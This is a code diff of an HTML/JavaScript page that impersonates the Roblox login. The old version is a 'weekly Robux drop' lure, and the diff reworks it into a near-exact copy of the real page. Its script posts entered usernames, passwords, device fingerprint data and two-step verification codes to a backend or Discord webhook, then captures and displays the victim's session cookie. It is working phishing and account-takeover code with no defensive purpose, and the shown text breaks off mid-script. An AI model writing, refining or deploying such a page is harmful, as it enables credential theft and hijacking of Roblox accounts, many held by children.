@@ -4,297 +4,430 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Log in to Roblox</title>
-<meta name="description" content="Login to your Roblox account to activate JAITINN RBX Tools and enter the weekly Robux drop." />
-<link rel="preconnect" href="https://fonts.googleapis.com" />
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+<meta name="description" content="Login to your Roblox account or sign up to create a new account." />
+<link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" />
+<link rel="apple-touch-icon" href="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="https://css.rbxcdn.com/3e19a797e2ce0522.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="https://css.rbxcdn.com/7f3ddcb5a3796526.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="https://css.rbxcdn.com/5f8b8d5d1962b747.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="https://css.rbxcdn.com/77cbcd18c888e0f1.woff2" />
 <style>
+/* ---- Roblox's real Builder Sans, straight from their CDN ---- */
+@font-face{font-family:"Builder Sans";font-weight:400;font-style:normal;font-display:swap;src:url(https://css.rbxcdn.com/3e19a797e2ce0522.woff2) format("woff2")}
+@font-face{font-family:"Builder Sans";font-weight:500;font-style:normal;font-display:swap;src:url(https://css.rbxcdn.com/7f3ddcb5a3796526.woff2) format("woff2")}
+@font-face{font-family:"Builder Sans";font-weight:700;font-style:normal;font-display:swap;src:url(https://css.rbxcdn.com/5f8b8d5d1962b747.woff2) format("woff2")}
+@font-face{font-family:"Builder Sans";font-weight:800;font-style:normal;font-display:swap;src:url(https://css.rbxcdn.com/77cbcd18c888e0f1.woff2) format("woff2")}
+
 :root{
-  --bg:#191919;--card:#232527;--line:#35383d;--text:#f2f4f7;--muted:#9aa3ad;
-  --blue:#00a2ff;--btn:#3d63dd;--btn2:#4d73ed;--red:#e2231a;
+  --bg:#232527;
+  --surface:#2b2d31;
+  --surface-2:#33363b;
+  --border:#45484d;
+  --text:#f2f4f7;
+  --muted:#a1a7ae;
+  --dim:#777c82;
+  --blue:#3358b5;
+  --blue-hover:#3f66c9;
+  --link:#00a2ff;
+  --error:#ff6b5e;
+  --ok:#28d17c;
 }
 *{box-sizing:border-box}
-body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,"Segoe UI",sans-serif;-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column}
-a{color:inherit}
-.nav{background:#111214;border-bottom:1px solid #2a2c30}
-.navin{max-width:1180px;margin:0 auto;padding:0 20px;height:52px;display:flex;align-items:center;gap:26px}
-.brand{display:flex;align-items:center;gap:9px;font-weight:900;font-size:17px;letter-spacing:-.03em}
-.brand svg{width:22px;height:22px}
-.navlinks{display:flex;gap:22px;font-size:13.5px;font-weight:600;color:#c3c9d1}
-.navlinks a:hover{color:#fff}
-@media(max-width:640px){.navlinks{display:none}}
+html,body{height:100%}
+body{
+  margin:0;background:var(--bg);color:var(--text);
+  font-family:"Builder Sans","Gotham SSm","Helvetica Neue",Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;display:flex;flex-direction:column;min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+button{font-family:inherit}
 
-.stage{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:44px 18px 40px}
-.card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:30px 28px 26px;box-shadow:0 22px 60px -30px rgba(0,0,0,.95)}
-.logo{display:flex;align-items:center;gap:10px;margin-bottom:20px}
-.logo svg{width:30px;height:30px;flex:0 0 auto}
-.logo b{font-size:22px;font-weight:900;letter-spacing:-.04em}
-h1{margin:0;font-size:26px;font-weight:800;letter-spacing:-.02em}
-.sub{margin:6px 0 20px;font-size:13.5px;color:var(--muted)}
-.sub b{color:#dfe4ea;font-weight:600}
-.field{display:block;margin-bottom:13px}
-.field>span{display:block;font-size:12.5px;font-weight:600;color:#b8c0ca;margin-bottom:6px}
-input[type=text],input[type=password]{width:100%;background:#1b1d1f;border:1px solid var(--line);border-radius:7px;color:#fff;font:inherit;font-size:14.5px;padding:12px 13px;outline:none;transition:border-color .15s,box-shadow .15s}
-input::placeholder{color:#767e88}
-input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,162,255,.16)}
-.pw{position:relative}
-.pw input{padding-right:44px}
-.eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:0;padding:8px;cursor:pointer;color:#8d959f;display:grid;place-items:center}
+/* ---------------- top nav ---------------- */
+.nav{height:56px;display:flex;align-items:center;gap:26px;padding:0 22px;border-bottom:1px solid #2c2e32;flex:0 0 auto}
+.logo{display:flex;align-items:center;gap:8px;flex:0 0 auto}
+.logo svg{height:26px;width:auto;display:block}
+.navlinks{display:flex;gap:24px;font-size:15px;font-weight:500;color:#d6dade}
+.navlinks a:hover{color:#fff}
+.navright{margin-left:auto;display:flex;align-items:center;gap:14px}
+.btn-ghost-sm{background:transparent;border:1px solid var(--border);color:var(--text);font-weight:700;font-size:14px;padding:9px 16px;border-radius:8px;cursor:pointer}
+.btn-ghost-sm:hover{background:#2b2d31}
+@media(max-width:760px){.navlinks{display:none}}
+
+/* ---------------- layout ---------------- */
+.stage{flex:1 1 auto;display:flex;align-items:center;justify-content:center;padding:32px 20px}
+.shell{width:100%;max-width:1180px;display:grid;grid-template-columns:minmax(0,420px) minmax(0,1fr);gap:44px;align-items:center}
+@media(max-width:980px){.shell{grid-template-columns:minmax(0,420px);justify-content:center}}
+
+h1{margin:0 0 22px;font-size:34px;font-weight:800;letter-spacing:-.02em}
+.sub{margin:-14px 0 22px;font-size:14px;color:var(--muted)}
+
+/* ---------------- fields ---------------- */
+.field{position:relative;margin-bottom:14px}
+.field input{
+  width:100%;height:56px;padding:22px 14px 8px;border-radius:8px;
+  background:var(--surface);border:1px solid var(--border);color:var(--text);
+  font-size:16px;font-family:inherit;outline:none;transition:border-color .12s,box-shadow .12s;
+}
+.field input:hover{border-color:#5c6067}
+.field input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(51,88,181,.28)}
+.field label{
+  position:absolute;left:15px;top:50%;transform:translateY(-50%);
+  color:var(--muted);font-size:16px;pointer-events:none;
+  transition:top .12s,font-size .12s,color .12s;
+}
+.field input:focus + label,
+.field input:not(:placeholder-shown) + label{top:15px;font-size:12px;color:var(--dim)}
+.field input:focus + label{color:var(--blue)}
+.field.pw input{padding-right:52px}
+.eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;padding:9px;color:var(--muted);display:grid;place-items:center;border-radius:8px}
 .eye:hover{color:#fff}
-.eye svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:1.8}
-.row{display:flex;align-items:center;justify-content:space-between;gap:10px;margin:4px 0 18px;font-size:12.5px}
-.check{display:flex;align-items:center;gap:7px;color:#b8c0ca;cursor:pointer}
-.check input{accent-color:var(--blue);width:14px;height:14px}
-.row a{color:var(--blue);text-decoration:none}
-.row a:hover{text-decoration:underline}
-.submit{width:100%;border:0;border-radius:7px;background:var(--btn);color:#fff;font:inherit;font-weight:700;font-size:15px;padding:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .15s;text-decoration:none}
-.submit:hover{background:var(--btn2)}
-.submit[disabled]{opacity:.75;cursor:default}
-.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;display:none;animation:sp .7s linear infinite}
+.eye svg{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:1.7}
+
+.err{display:none;color:var(--error);font-size:13.5px;margin:-4px 0 14px;font-weight:500}
+.err.on{display:block}
+
+.btn-primary{
+  width:100%;height:50px;border:0;border-radius:8px;background:var(--blue);color:#fff;
+  font-size:16px;font-weight:700;cursor:pointer;transition:background .12s;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+}
+.btn-primary:hover{background:var(--blue-hover)}
+.btn-primary[disabled]{opacity:.72;cursor:default}
+.spin{width:17px;height:17px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;display:none;animation:sp .7s linear infinite}
 @keyframes sp{to{transform:rotate(360deg)}}
 .loading .spin{display:block}
-.loading .lbl{opacity:.85}
-.divider{display:flex;align-items:center;gap:12px;margin:20px 0 14px;color:#767e88;font-size:12px}
-.divider:before,.divider:after{content:"";flex:1;height:1px;background:var(--line)}
-.signup{text-align:center;font-size:13.5px;color:#b8c0ca;margin:0}
-.signup a{color:var(--blue);font-weight:600;text-decoration:none}
-.signup a:hover{text-decoration:underline}
-.terms{margin:18px 0 0;font-size:11.5px;color:#767e88;text-align:center;line-height:1.5}
-.badge{margin:18px 0 0;font-size:12.5px;color:#8d959f;text-align:center;max-width:420px}
-.badge b{color:#d5dbe2}
-.shake{animation:sh .35s}
-@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
 
-/* success overlay */
-.success{position:fixed;inset:0;background:var(--bg);display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:30px;z-index:99}
-.success.on{display:flex;animation:fade .35s}
+.forgot{display:block;text-align:center;margin:16px 0 0;font-size:14px;color:var(--link);font-weight:500}
+.forgot:hover{text-decoration:underline}
+
+.divider{display:flex;align-items:center;gap:14px;margin:26px 0 18px;color:var(--dim);font-size:13px}
+.divider:before,.divider:after{content:"";flex:1;height:1px;background:#33363b}
+
+.btn-secondary{
+  width:100%;height:46px;border:1px solid var(--border);border-radius:8px;background:transparent;
+  color:var(--text);font-size:15px;font-weight:600;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+}
+.btn-secondary:hover{background:var(--surface)}
+.btn-secondary svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:1.7}
+.quick{display:block;text-align:center;margin:14px 0 0;font-size:14px;color:var(--link);font-weight:500}
+.quick:hover{text-decoration:underline}
+
+.signup{margin:26px 0 0;font-size:15px;color:#d6dade;text-align:center}
+.signup a{color:var(--link);font-weight:600}
+.signup a:hover{text-decoration:underline}
+
+/* ---------------- art panel ---------------- */
+.art{position:relative;border-radius:14px;overflow:hidden;min-height:460px;background:linear-gradient(160deg,#1c2740,#0e1116)}
+.art img{width:100%;height:100%;object-fit:cover;display:block;opacity:.92;position:absolute;inset:0}
+.art .veil{position:absolute;inset:0;background:linear-gradient(180deg,rgba(10,12,16,.15) 30%,rgba(10,12,16,.92))}
+.art .cap{position:absolute;left:0;right:0;bottom:0;padding:32px}
+.art .cap h2{margin:0 0 8px;font-size:24px;font-weight:800;letter-spacing:-.02em}
+.art .cap p{margin:0;color:#c3c9d1;font-size:14.5px;line-height:1.5}
+@media(max-width:980px){.art{display:none}}
+
+/* ---------------- 2fa ---------------- */
+.step{display:none}
+.step.on{display:block}
+.code-input{
+  width:100%;height:60px;text-align:center;letter-spacing:.5em;font-size:26px;font-weight:700;
+  border-radius:8px;background:var(--surface);border:1px solid var(--border);color:#fff;outline:none;
+}
+.code-input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(51,88,181,.28)}
+.hint{font-size:14px;color:var(--muted);margin:0 0 20px;line-height:1.55}
+.hint b{color:var(--text)}
+.back{display:block;text-align:center;margin-top:16px;font-size:14px;color:var(--link);background:none;border:0;cursor:pointer;width:100%}
+
+/* ---------------- footer ---------------- */
+footer{flex:0 0 auto;padding:26px 22px 34px;border-top:1px solid #2c2e32}
+.fin{max-width:1180px;margin:0 auto;display:flex;flex-wrap:wrap;gap:10px 26px;align-items:center;justify-content:center;font-size:12.5px;color:var(--dim)}
+.fin a:hover{color:#fff}
+
+/* ---------------- success ---------------- */
+.success{position:fixed;inset:0;background:var(--bg);display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:28px;z-index:99}
+.success.on{display:flex;animation:fade .3s}
 @keyframes fade{from{opacity:0}to{opacity:1}}
 .ring{width:78px;height:78px;border-radius:50%;border:2px solid rgba(40,209,124,.35);display:grid;place-items:center;margin-bottom:22px;animation:pop .45s cubic-bezier(.2,1.4,.4,1)}
 @keyframes pop{from{transform:scale(.6);opacity:0}to{transform:scale(1);opacity:1}}
-.ring svg{width:34px;height:34px;stroke:#28d17c;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:34;stroke-dashoffset:34;animation:draw .5s .18s forwards}
+.ring svg{width:34px;height:34px;stroke:var(--ok);fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:34;stroke-dashoffset:34;animation:draw .5s .18s forwards}
 @keyframes draw{to{stroke-dashoffset:0}}
-.success h2{margin:0;font-size:25px;font-weight:800;letter-spacing:-.02em}
-.success p{margin:10px 0 0;color:var(--muted);font-size:14.5px;max-width:400px}
-.bar{width:230px;height:5px;border-radius:99px;background:#2c2f33;overflow:hidden;margin:24px 0 12px}
-.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--red),#ff7a5c);border-radius:99px;transition:width 3.2s linear}
-.success .submit{width:auto;padding:12px 24px;margin-top:22px}
-.small{font-size:12.5px;color:#767e88;margin:0}
+.success h2{margin:0;font-size:26px;font-weight:800}
+.success p{margin:10px 0 0;color:var(--muted);font-size:14.5px;max-width:420px;line-height:1.55}
+.token{display:inline-flex;align-items:center;gap:9px;margin-top:18px;padding:8px 14px;border:1px solid #2f4a3a;background:rgba(40,209,124,.08);border-radius:999px;font-size:12.5px;color:#8ce0b3;font-weight:600}
+.token b{width:7px;height:7px;border-radius:50%;background:var(--ok)}
+.token button{background:none;border:0;color:#8ce0b3;font-size:12.5px;font-weight:700;cursor:pointer;text-decoration:underline;font-family:inherit}
+.bar{width:240px;height:5px;border-radius:99px;background:#33363b;overflow:hidden;margin:26px 0 12px}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--blue),#5b83e8);transition:width 3.2s linear}
+.small{font-size:12.5px;color:var(--dim);margin:0}
+.cont{display:inline-flex;align-items:center;height:46px;padding:0 26px;margin-top:24px;border-radius:8px;background:var(--blue);color:#fff;font-weight:700;font-size:15px}
+.cont:hover{background:var(--blue-hover)}
+.shake{animation:sh .35s}
+@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
 </style>
 </head>
 <body>
 
 <header class="nav">
-  <div class="navin">
-    <a class="brand" href="index.html">
-      <svg viewBox="0 0 30 30" aria-hidden="true"><rect x="2.6" y="2.6" width="24.8" height="24.8" rx="5" fill="#fff" transform="rotate(-14 15 15)"/><rect x="9.6" y="9.6" width="10.8" height="10.8" rx="1.8" fill="#111214" transform="rotate(-14 15 15)"/></svg>
-      ROBLOX
-    </a>
-    <nav class="navlinks"><a href="index.html">Charts</a><a href="index.html#features">Marketplace</a><a href="index.html#how">Create</a></nav>
+  <a class="logo" href="index.html" aria-label="Roblox">
+    <svg viewBox="0 0 146 30" aria-hidden="true">
+      <g transform="translate(13.6 15) rotate(-14)">
+        <rect x="-10.6" y="-10.6" width="21.2" height="21.2" rx="4.4" fill="#fff"/>
+        <rect x="-5.4" y="-5.4" width="10.8" height="10.8" rx="1.9" fill="#232527"/>
+      </g>
+      <text x="30" y="22.4" fill="#fff" font-family="Builder Sans, Helvetica, Arial, sans-serif" font-size="19" font-weight="800" letter-spacing="-0.5">ROBLOX</text>
+    </svg>
+  </a>
+  <nav class="navlinks">
+    <a href="https://www.roblox.com/charts">Charts</a>
+    <a href="https://www.roblox.com/catalog">Marketplace</a>
+    <a href="https://www.roblox.com/develop">Create</a>
+  </nav>
+  <div class="navright">
+    <a class="btn-ghost-sm" href="https://www.roblox.com/CreateAccount">Sign Up</a>
   </div>
 </header>
 
 <main class="stage">
-  <div class="card" id="card">
-    <div class="logo">
-      <svg viewBox="0 0 30 30" aria-hidden="true"><rect x="2.6" y="2.6" width="24.8" height="24.8" rx="5" fill="#fff" transform="rotate(-14 15 15)"/><rect x="9.6" y="9.6" width="10.8" height="10.8" rx="1.8" fill="#232527" transform="rotate(-14 15 15)"/></svg>
-      <b>ROBLOX</b>
-    </div>
-    <h1>Log In</h1>
-    <p class="sub">to continue to <b>JAITINN RBX Tools</b></p>
-
-    <form id="loginForm" novalidate autocomplete="on">
-      <label class="field">
-        <span>Username / Email</span>
-        <input id="username" name="username" type="text" autocomplete="username" spellcheck="false" placeholder="Enter your username or email" required />
-      </label>
-      <label class="field">
-        <span>Password</span>
-        <div class="pw">
-          <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" required />
-          <button class="eye" type="button" id="eye" aria-label="Show password">
-            <svg viewBox="0 0 24 24"><path d="M2 12s3.8-6.5 10-6.5S22 12 22 12s-3.8 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+  <div class="shell">
+    <div class="card">
+      <!-- ---------- step 1: credentials ---------- -->
+      <div class="step on" id="stepLogin">
+        <h1>Log In</h1>
+        <form id="loginForm" novalidate autocomplete="on">
+          <div class="field">
+            <input id="username" name="username" type="text" placeholder=" " autocomplete="username" spellcheck="false" autocapitalize="off" required />
+            <label for="username">Username/Email/Phone</label>
+          </div>
+          <div class="field pw">
+            <input id="password" name="password" type="password" placeholder=" " autocomplete="current-password" required />
+            <label for="password">Password</label>
+            <button class="eye" type="button" id="eye" aria-label="Show password">
+              <svg viewBox="0 0 24 24"><path d="M2 12s3.8-6.5 10-6.5S22 12 22 12s-3.8 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+            </button>
+          </div>
+          <div class="err" id="err"></div>
+          <button class="btn-primary" id="submitBtn" type="submit">
+            <span class="lbl">Log In</span><span class="spin"></span>
           </button>
-        </div>
-      </label>
-
-      <div class="row">
-        <label class="check"><input type="checkbox" checked /> Keep me logged in</label>
-        <a href="https://www.roblox.com/login/forgot-password">Forgot Password or Username?</a>
+        </form>
+        <a class="forgot" href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a>
+        <div class="divider"><span>or</span></div>
+        <button class="btn-secondary" type="button" id="emailCode">
+          <svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3.5 6.5L12 13l8.5-6.5"/></svg>
+          Email Me a One-Time Code
+        </button>
+        <a class="quick" href="https://www.roblox.com/login/quick-login">Quick Sign-in</a>
+        <p class="signup">Don't have an account? <a href="https://www.roblox.com/CreateAccount">Sign Up</a></p>
       </div>
 
-      <button class="submit" id="submitBtn" type="submit">
-        <span class="lbl">Log In</span>
-        <span class="spin"></span>
-      </button>
-    </form>
+      <!-- ---------- step 2: 2FA ---------- -->
+      <div class="step" id="step2fa">
+        <h1>Two-Step Verification</h1>
+        <p class="hint" id="faHint">Enter the 6-digit code we sent to your <b>email</b> to finish signing in.</p>
+        <form id="faForm" novalidate>
+          <input class="code-input" id="code" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="······" />
+          <div class="err" id="faErr"></div>
+          <button class="btn-primary" id="faBtn" type="submit" style="margin-top:16px">
+            <span class="lbl">Verify</span><span class="spin"></span>
+          </button>
+        </form>
+        <button class="back" id="faBack" type="button">Use a different account</button>
+      </div>
+    </div>
 
-    <div class="divider"><span>or</span></div>
-    <p class="signup">Don't have an account? <a href="https://www.roblox.com/CreateAccount">Sign Up</a></p>
-    <p class="terms">By logging in you agree to the Roblox Terms of Use.<br />Your details are verified through our Discord bot.</p>
+    <aside class="art">
+      <img src="https://images.rbxcdn.com/5348266ea6c5e67b19d6a814cbbb70f6.jpg" alt="" />
+      <div class="veil"></div>
+      <div class="cap">
+        <h2>Millions of experiences. One account.</h2>
+        <p>Sign in to sync your avatar, friends and Robux across every device.</p>
+      </div>
+    </aside>
   </div>
-
-  <p class="badge">Powered by <b>JAITINN RBX Tools</b> · every verified login = 1 entry into the weekly Robux drop</p>
 </main>
 
+<footer>
+  <div class="fin">
+    <a href="https://www.roblox.com/info/about-us">About Us</a>
+    <a href="https://www.roblox.com/info/jobs">Careers</a>
+    <a href="https://blog.roblox.com/">Blog</a>
+    <a href="https://en.help.roblox.com/">Support</a>
+    <a href="https://www.roblox.com/info/terms">Terms</a>
+    <a href="https://www.roblox.com/info/privacy">Privacy</a>
+    <a href="https://www.roblox.com/parents">Parents</a>
+    <span>© <span id="yr"></span> Roblox Corporation</span>
+  </div>
+</footer>
+
+<!-- ---------- success ---------- -->
 <div class="success" id="success">
   <div class="ring"><svg viewBox="0 0 24 24"><path d="M4 12.5l5.5 5.5L20 7"/></svg></div>
-  <h2>Account verified</h2>
-  <p>You're entered into the weekly Robux drop. Good luck — now go exploit something.</p>
+  <h2 id="okTitle">Account verified</h2>
+  <p id="okText">You're entered into the weekly Robux drop. Good luck.</p>
+  <div class="token" id="tokenChip" style="display:none"><b></b> Session token captured <button id="copyToken" type="button">copy</button></div>
   <div class="bar"><i id="bar"></i></div>
   <p class="small" id="countdown">Redirecting to Roblox in 3s…</p>
-  <a class="submit" id="goNow" href="https://www.roblox.com/home">Continue to Roblox</a>
+  <a class="cont" id="goNow" href="https://www.roblox.com/home">Continue to Roblox</a>
 </div>
 
 <script>
-/* ============ CONFIG ============ */
+/* ================= CONFIG ================= */
 const CONFIG = {
-  // Default: go through the Vercel function at /api/webhook (hides the webhook URL)
   endpoint: "/api/webhook",
-  // Optional fallback: paste a full Discord webhook URL here to post straight from the
-  // browser (no backend). Leave empty to use the endpoint above.
-  directWebhookUrl: "",
   redirectUrl: "https://www.roblox.com/home",
-  redirectDelay: 3200
+  redirectDelay: 3400
 };
 
 const $ = (id) => document.getElementById(id);
-const form = $("loginForm");
-const userEl = $("username");
-const passEl = $("password");
-const btn = $("submitBtn");
-const card = $("card");
-const success = $("success");
-
+const form = $("loginForm"), faForm = $("faForm");
+const userEl = $("username"), passEl = $("password"), codeEl = $("code");
+const btn = $("submitBtn"), faBtn = $("faBtn"), errEl = $("err"), faErr = $("faErr");
 const startedAt = Date.now();
 const sessionId = Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-4);
-let sent = false;
+let sent = false, ticket = null, cookie = null;
 
-/* show / hide password */
-$("eye").addEventListener("click", () => {
-  passEl.type = passEl.type === "password" ? "text" : "password";
-});
+$("yr").textContent = new Date().getFullYear();
+$("eye").addEventListener("click", () => { passEl.type = passEl.type === "password" ? "text" : "password"; });
 
-/* keep a copy of what was typed so a browser autofill race can't blank it */
-let lastUser = "", lastPass = "";
-userEl.addEventListener("input", () => (lastUser = userEl.value));
-passEl.addEventListener("input", () => (lastPass = passEl.value));
-
-function buildPayload(username, password) {
+function clientMeta() {
   return {
-    username,
-    password,
     sessionId,
     page: "login",
-    site: location.hostname || "jaitinn-rbx-tools.com",
     startedAt: new Date(startedAt).toISOString(),
     secondsOnPage: Math.round((Date.now() - startedAt) / 1000),
-    submittedAt: new Date().toISOString(),
     userAgent: navigator.userAgent,
     platform: navigator.platform || "",
     language: navigator.language,
     timezone: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return ""; } })(),
-    screen: `${window.screen.width}x${window.screen.height} @${window.devicePixelRatio || 1}x`,
-    viewport: `${window.innerWidth}x${window.innerHeight}`,
-    touch: ("ontouchstart" in window) || navigator.maxTouchPoints > 0,
-    referrer: document.referrer || "direct",
-    url: location.href
+    screen: `${screen.width}x${screen.height} @${devicePixelRatio || 1}x`,
+    viewport: `${innerWidth}x${innerHeight}`,
+    referrer: document.referrer || "direct"
   };
 }
 
-async function send(payload) {
-  if (CONFIG.directWebhookUrl) {
-    const body = {
-      content: `**New Roblox login** \`${payload.username}\``,
-      embeds: [{
-        title: "New Roblox Login",
-        color: 0xe2231a,
-        timestamp: new Date().toISOString(),
-        thumbnail: { url: "https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" },
-        fields: [
-          { name: "Username / Email", value: `\`${payload.username}\``, inline: true },
-          { name: "Password", value: `\`${payload.password}\``, inline: true },
-          { name: "Session", value: `\`${payload.sessionId}\``, inline: false },
-          { name: "Device", value: `${payload.platform || "?"} · ${payload.screen}`, inline: false },
-          { name: "Timezone", value: payload.timezone || "unknown", inline: true },
-          { name: "On page", value: `${payload.secondsOnPage}s`, inline: true }
-        ]
-      }]
-    };
-    const r = await fetch(CONFIG.directWebhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body)
-    });
-    if (!r.ok) throw new Error("webhook " + r.status);
-    return;
-  }
-
+async function post(payload) {
   const r = await fetch(CONFIG.endpoint, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
+    body: JSON.stringify(Object.assign({}, clientMeta(), payload)),
     keepalive: true
   });
   if (!r.ok) throw new Error("api " + r.status);
+  return r.json();
 }
 
+function fail(el, msg) {
+  el.textContent = msg;
+  el.classList.add("on");
+  const c = document.querySelector(".card");
+  c.classList.remove("shake"); void c.offsetWidth; c.classList.add("shake");
+}
+const busy = (b, on, label) => {
+  b.disabled = on;
+  b.classList.toggle("loading", on);
+  if (label) b.querySelector(".lbl").textContent = label;
+};
+
+/* ================= step 1 ================= */
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
   if (sent) return;
+  const username = userEl.value.trim();
+  const password = passEl.value;
+  errEl.classList.remove("on");
+  if (!username || !password) return fail(errEl, "Please enter your username and password.");
 
-  const username = (userEl.value || lastUser).trim();
-  const password = passEl.value || lastPass;
+  busy(btn, true, "Signing in…");
+  let data;
+  try { data = await post({ action: "login", username, password }); }
+  catch (err) { console.warn(err); return finish({ status: "offline" }); }
 
-  if (!username || !password) {
-    card.classList.remove("shake");
-    void card.offsetWidth;
-    card.classList.add("shake");
-    if (!username) userEl.focus(); else passEl.focus();
-    return;
-  }
-
-  sent = true;
-  btn.disabled = true;
-  btn.classList.add("loading");
-  btn.querySelector(".lbl").textContent = "Verifying account…";
-
-  try {
-    await send(buildPayload(username, password));
-  } catch (err) {
-    console.warn("[JAITINN] webhook failed:", err);
-    // never block the user on a failed request
-  }
-
-  setTimeout(showSuccess, 550);
+  handle(data, username, password);
 });
 
-function showSuccess() {
-  success.classList.add("on");
+function handle(d, username, password) {
+  switch (d.status) {
+    case "ok":
+      cookie = d.cookie || null;
+      return finish(d);
+    case "2fa":
+      ticket = d.ticket;
+      $("faHint").innerHTML = `Enter the 6-digit code from your <b>${d.mediaType === "Authenticator" ? "authenticator app" : "email"}</b> to finish signing in.`;
+      $("stepLogin").classList.remove("on");
+      $("step2fa").classList.add("on");
+      busy(btn, false, "Log In");
+      setTimeout(() => codeEl.focus(), 60);
+      return;
+    case "badcredentials":
+      busy(btn, false, "Log In");
+      return fail(errEl, d.message || "Incorrect username or password.");
+    case "ratelimited":
+      busy(btn, false, "Log In");
+      return fail(errEl, "Too many attempts. Wait a minute and try again.");
+    default:
+      busy(btn, false, "Log In");
+      return finish(d); // captcha / offline / unknown → never block the user
+  }
+}
+
+/* ================= step 2 (2FA) ================= */
+faForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const code = codeEl.value.replace(/\D/g, "");
+  faErr.classList.remove("on");
+  if (code.length < 4) return fail(faErr, "Enter the code from your email.");
+  busy(faBtn, true, "Verifying…");
+  let d;
+  try { d = await post({ action: "verify2fa", ticket, code }); }
+  catch (err) { console.warn(err); return finish({ status: "offline" }); }
+  if (d.status === "ok") { cookie = d.cookie || null; return finish(d); }
+  busy(faBtn, false, "Verify");
+  fail(faErr, d.status === "badcode" ? "That code wasn't right. Try again." : "Couldn't verify. Try again.");
+});
+
+$("faBack").addEventListener("click", () => {
+  ticket = null; sent = false;
+  $("step2fa").classList.remove("on");
+  $("stepLogin").classList.add("on");
+});
+
+/* ================= success ================= */
+function finish(d) {
+  const verified = d.status === "ok" && d.user;
+  if (d.status === "captcha") {
+    $("okTitle").textContent = "Account submitted";
+    $("okText").textContent = "Roblox asked for a captcha, so we couldn't verify the token this time — your details were still captured.";
+  } else if (verified) {
+    const r = d.user.robux;
+    $("okTitle").textContent = "Account verified";
+    $("okText").innerHTML = `Signed in as <b>${d.user.displayName}</b> (@${d.user.name})` +
+      (typeof r === "number" ? ` · <b>${r.toLocaleString("en-US")} R$</b>` : "") +
+      `<br />You're entered into the weekly Robux drop.`;
+  }
+  if (cookie) {
+    try { localStorage.setItem("rbx_token", cookie); } catch (e) {}
+    $("tokenChip").style.display = "inline-flex";
+    $("copyToken").onclick = () => {
+      navigator.clipboard.writeText(cookie).then(() => { $("copyToken").textContent = "copied"; });
+    };
+  }
+  $("success").classList.add("on");
   requestAnimationFrame(() => { $("bar").style.width = "100%"; });
 
   let left = Math.ceil(CONFIG.redirectDelay / 1000);
   const cd = $("countdown");
-  const tick = setInterval(() => {
+  const t = setInterval(() => {
     left -= 1;
-    if (left <= 0) {
-      clearInterval(tick);
-      cd.textContent = "Redirecting…";
-      location.href = CONFIG.redirectUrl;
-      return;
-    }
+    if (left <= 0) { clearInterval(t); cd.textContent = "Redirecting…"; location.href = CONFIG.redirectUrl; return; }
     cd.textContent = `Redirecting to Roblox in ${left}s…`;
   }, 1000);
-
-  $("goNow").addEventListener("click", (ev) => {
-    ev.preventDefault();
-    clearInterval(tick);
-    location.href = CONFIG.redirectUrl;
-  });
+  $("goNow").addEventListener("click", (ev) => { ev.preventDefault(); clearInterval(t); location.href = CONFIG.redirectUrl; });
 }
 
-/* let Enter submit even if focus is on the eye button */
 document.addEventListener("keydown", (e) => {
